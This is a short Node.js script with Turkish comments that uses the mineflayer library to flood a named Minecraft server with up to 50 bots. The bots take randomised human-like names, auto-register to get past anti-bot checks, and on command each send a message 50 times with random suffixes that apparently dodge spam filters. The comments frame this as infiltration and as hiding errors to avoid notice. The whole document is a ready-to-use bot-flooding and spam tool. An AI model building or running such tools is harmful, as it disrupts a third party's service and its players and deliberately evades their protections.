const mineflayer = require('mineflayer');
const readline = require('readline');

const host = 'nohaisenw.falixsrv.me'; 
const port = 25565;
const botLimit = 50; 

const bots = {};
const rl = readline.createInterface({ input: process.stdin, output: process.stdout, prompt: 'ELITE-CMD> ' });

function createEliteBot(id) {
    const name = `Player_${Math.floor(Math.random()*8999 + 1000)}`; // İsimleri daha insansı yapalım
    
    const bot = mineflayer.createBot({
        host: host,
        port: port,
        username: name,
        // Sürümü buraya yazma, sunucuyla kendi anlaşsın
        hideErrors: true, // Hataları gizle, konsol temiz kalsın
        connectTimeout: 30000
    });

    // Sadece başarılı girişleri yazdır
    bot.on('login', () => {
        console.log(`\x1b[32m[OK]\x1b[0m ${name} içeri sızdı.`);
        bots[name] = bot;
        
        // Anti-Bot geçmek için hafif hareket
        setTimeout(() => {
            if (bot.chat) {
                bot.chat(`/register Sifre123 Sifre123`);
                bot.chat(`/login Sifre123`);
            }
        }, 5000);
    });

    // Bağlantı hatalarını sessizce yönet
    bot.on('error', () => { delete bots[name]; });
    bot.on('end', () => { delete bots[name]; });
}

rl.on('line', (input) => {
    if (input.startsWith('say ')) {
        const msg = input.replace('say ', '');
        const activeList = Object.values(bots);
        console.log(`\x1b[41m[EMİR]\x1b[0m ${activeList.length} bot mesajı ateşliyor!`);

        activeList.forEach((bot, index) => {
            for (let i = 1; i <= 50; i++) {
                setTimeout(() => {
                    if (bot.chat) bot.chat(`${msg} [${i}] #${Math.random().toString(36).substring(7)}`);
                }, (index * 100) + (i * 1200));
            }
        });
    }
    rl.prompt();
});

console.log(`\x1b[44m[SİSTEM]\x1b[0m Operasyon başladı, botlar sızıyor...`);
for (let i = 0; i < botLimit; i++) {
    setTimeout(() => createEliteBot(i), i * 5000); // 5 saniyede bir, çok yavaş ama güvenli
}
rl.prompt();

